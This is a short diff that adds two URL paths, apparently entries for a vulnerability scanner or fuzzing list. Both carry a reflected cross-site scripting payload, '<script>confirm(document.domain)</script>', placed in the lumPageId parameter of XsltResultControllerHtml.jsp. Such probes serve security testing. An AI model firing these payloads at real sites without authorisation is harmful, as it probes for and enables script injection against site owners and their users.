@@ -1,0 +1,2 @@
+/portal/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=
+/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=
